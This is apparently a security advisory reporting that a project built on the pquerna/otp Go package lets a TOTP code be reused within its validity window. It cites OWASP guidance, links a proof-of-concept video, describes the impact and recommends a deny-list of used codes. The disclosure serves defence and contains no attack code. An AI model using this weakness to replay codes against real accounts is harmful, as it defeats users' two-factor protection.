The https://github.com/pquerna/otp package [doesn't include](https://github.com/pquerna/otp/issues/61) checking for already used TOTPs within its the validity window. This requires each application that uses the package to implement their own method of tracking and verifying that codes can't be reused.

Section 6.5.1 within the [Authentication](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x15-V6-Authentication.md) section of the OWASP ASVS recommends multiple checks, some of which involving TOTPs:

> Verify that lookup secrets, out-of-band authentication requests or codes, and time-based one-time passwords (TOTPs) are only successfully usable once.

The OWASP WSTG also references this as one of their [checks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication) to look for:

> Can the OTPs be used more than once?

### PoC

https://github.com/user-attachments/assets/86a43374-39bf-4d61-8f6d-5cc440c99a1e

### Impact
Any user who uses 2FA could be impacted if their traffic is able to be captured, they're phished/social engineered, or other methods of attack. This disrupts one layer of the defense-in-depth model surrounding 2FA.

### Similar CVEs
- [CVE-2025-6014](https://nvd.nist.gov/vuln/detail/CVE-2025-6014)
- [CVE-2025-55003](https://nvd.nist.gov/vuln/detail/CVE-2025-55003)
- [CVE-2026-33473](https://github.com/go-vikunja/vikunja/security/advisories/GHSA-p747-qc5p-773r)

### Remediation
Store a deny-list of TOTP codes for their validity windows and check submitted codes against it to ensure none are being reused. After their validity window has closed, the 2FA code can be removed from the list.
